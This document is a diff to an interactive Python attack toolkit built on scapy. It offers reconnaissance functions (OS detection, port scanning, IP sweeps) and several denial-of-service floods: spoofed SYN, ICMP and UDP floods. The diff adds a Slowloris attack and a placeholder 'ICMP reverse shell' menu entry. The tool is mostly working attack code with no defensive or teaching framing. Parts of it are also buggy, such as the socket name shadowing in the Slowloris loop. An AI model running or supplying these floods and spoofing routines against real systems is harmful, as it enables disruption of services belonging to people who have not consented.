@@ -2,6 +2,10 @@ from scapy.all import *
 import os
 import sys
 import argparse
+import urllib.request
+from ipaddress import IPv4Network
+from tqdm import tqdm
+
 
 def os_detection():
     print("Insert target IP address: ")
@@ -25,6 +29,9 @@ def os_detection():
             else:
                 print("The packet's TTL is " + str(res.getlayer(IP).ttl))
                 print("OS is Windows")
+    
+    print("Click enter to continue...")
+    input()
 
 def port_scanner():
 
@@ -46,9 +53,10 @@ def port_scanner():
                 print ("Port " + str(port) + " is open")
         elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
             pass
+    print("Click enter to continue...")
+    input()
 
 def ip_sweep():
-
 
     # Defines network to analyze
     print("Insert the network address to scan (The format should be xxx.xxx.xxx.xxx/xx):")
@@ -56,30 +64,19 @@ def ip_sweep():
 
     print("Analyzing hosts in network " + network)
 
-    # make list of addresses out of network, set live host counter
-    def sweep(i):
-        index = int(i)
-        counter = index-63
-        addresses = IPv4Network(network)
-        # Send ICMP ping request, wait for answer
-        for j in range (counter, index):
-            #sr1() is a function that generates and sends packets and assigns to a variable a certain state 
-            #depending from the fact that the packet/s sent did/did not receive an answer.
-            resp = sr1(IP(dst=str(addresses[j]))/ICMP(), timeout=0.01, verbose = 0)
-            if resp is None:
-                pass
-            else:
-                print(f"{addresses[j]} is responding.")        
-
-    t1 = threading.Thread(target=sweep, args = ("64",))
-    t2 = threading.Thread(target=sweep, args = ("128",))
-    t3 = threading.Thread(target=sweep, args = ("192",))
-    t4 = threading.Thread(target=sweep, args = ("256",))
-
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()    
+    addresses = IPv4Network(network)
+    # Send ICMP ping request, wait for answer
+    for j in range (0, 100):
+        #sr1() is a function that generates and sends packets and assigns to a variable a certain state 
+        #depending from the fact that the packet/s sent did/did not receive an answer.
+        resp = sr1(IP(dst=str(addresses[j]))/ICMP(), timeout=0.01, verbose = 0)
+        if resp is None:
+            pass
+        else:
+            print(f"{addresses[j]} is responding.")
+    
+    print("Click enter to continue...")
+    input()
 
 def ip_spoof():
     # Simple version
@@ -87,9 +84,18 @@ def ip_spoof():
     target = input()
     numPackets = int(input("Insert the number of packets to send: "))
 
-    for i in range (numPackets):
-        packet = scapy.IP(src = RandShort(), dst = target)/scapy.ICMP()/"whoamI"
-        send(packet)
+    print("Sending...")
+
+    for i in tqdm(range (numPackets)):
+        packet = IP(src = RandShort(), dst = target)/ICMP()/"whoamI"
+        send(packet, verbose=False)
+
+    print("\n")
+    print(str(numPackets) + " spoofed packets have been sent to " + str(target) + ".")
+    print("\n")
+    
+    print("Click enter to continue...")
+    input()
 
 def syn_flood():
     print("Insert target IP address: ")
@@ -119,8 +125,8 @@ def spoofed_syn_flood():
     print("Attacking " + target + " with SPOOFED SYN flood.")
 
     def spoofed_flood():
-        packet = scapy.IP(src="192.168.4." + str(random.randint(2, 253)), dst=target) / \
-            scapy.TCP(dport=139, flags="S") / ("payloadpayloadpayload")
+        packet = IP(src="192.168.4." + str(random.randint(2, 253)), dst=target) / \
+            TCP(dport=139, flags="S") / ("payloadpayloadpayload")
         send(packet, inter=0.000001, loop=1)
 
     t1 = threading.Thread(target=spoofed_flood())
@@ -140,7 +146,7 @@ def icmp_flood():
     print("Attacking " + target + " with ICMP flood.")
 
     def flood():
-        packet = scapy.IP(dst=target)/scapy.ICMP()/"random_payload"
+        packet = IP(dst=target)/ICMP()/"random_payload"
         send(packet, inter=0.00001, loop=1)
 
 
@@ -166,8 +172,8 @@ def spoofed_icmp_flood():
 
     def spoofed_flood():
         for i in range(num_packets):
-            packet = scapy.IP(src=RandIP(), dst=target) / \
-                scapy.ICMP()/"random_payload"
+            packet = IP(src=RandIP(), dst=target) / \
+                ICMP()/"random_payload"
             send(packet)
 
 
@@ -190,8 +196,8 @@ def spoofed_udp_flood():
 
     def spoofed_flood():
         try:
-            packet = scapy.IP(src=str(RandIP()), dst=target) / \
-                scapy.UDP(dport=RandShort()) / ("X" * RandByte())
+            packet = IP(src=str(RandIP()), dst=target) / \
+                UDP(dport=RandShort()) / ("X" * RandByte())
             send(packet, verbose=0, loop=1, inter=0.001)
         except KeyboardInterrupt as e:
             sys.exit(1)
@@ -206,6 +212,25 @@ def spoofed_udp_flood():
     t2.start()
     t3.start()
     t4.start()
+
+def icmp_reverse_shell():
+    return 0
+
+def slow_loris():
+    #implement slow loris attack
+    
+    print("Insert WebServer IP address: ")
+    target = input()
+    print("Attacking " + str(target) + " with slow loris attack.")
+
+    while True:
+        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket.connect((target, 80))
+        #check if connection is established
+        print("Connection established with " + str(target))
+        socket.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+        socket.send("User-Agent: {}\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+        socket.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 
 def choose_recon():
     #clear the screen
@@ -230,12 +255,16 @@ def choose_recon():
     choice = input("Enter your choice: ")
     if choice == "1":
         os_detection()
+        choose_recon()
     elif choice == "2":
         port_scanner()
+        choose_recon()
     elif choice == "3":
         ip_spoof()
+        choose_recon()
     elif choice == "4":
         ip_sweep()
+        choose_recon()
     elif choice == "5":
         print("Back to main menu.")
         os.system("clear")
@@ -266,14 +295,19 @@ def choose_dos():
     choice = input("Enter your choice: ")
     if choice == "1":
         syn_flood()
+        choose_dos()
     elif choice == "2":
         spoofed_syn_flood()
+        choose_dos()
     elif choice == "3":
         icmp_flood()
+        choose_dos()
     elif choice == "4":
         spoofed_icmp_flood()
+        choose_dos()
     elif choice == "5":
         spoofed_udp_flood()
+        choose_dos()
     elif choice == "6":
         print("Back to main menu.")
         os.system("clear")
@@ -295,6 +329,22 @@ def choose_exploit():
     print("----------------------------------------------")
     print("\n")
     print("Choose an exploit.")
+    print("1. ICMP Reverse Shell")
+    print("2. Slow Loris")
+    print("3. Exit")
+    print("----------------------------------------------")
+    choice = input("Enter your choice: ")
+    if choice == "1":
+        icmp_reverse_shell()
+    elif choice == "2":
+        slow_loris()
+    elif choice == "3":
+        print("Back to main menu.")
+        os.system("clear")
+        main()
+    else:
+        print("Invalid choice. Try again.")
+        choose_exploit()
 
 def main():
     os.system("clear")
